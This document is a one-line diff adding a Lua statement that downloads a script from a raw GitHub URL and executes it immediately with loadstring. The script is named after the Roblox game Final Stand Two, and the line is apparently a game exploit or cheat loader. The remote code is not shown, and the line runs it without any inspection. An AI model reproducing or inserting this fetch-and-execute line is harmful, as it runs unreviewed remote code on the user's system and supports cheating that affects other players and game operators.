@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yeerma/secret_bullshit/refs/heads/main/Final-Stand-Two.lua"))()
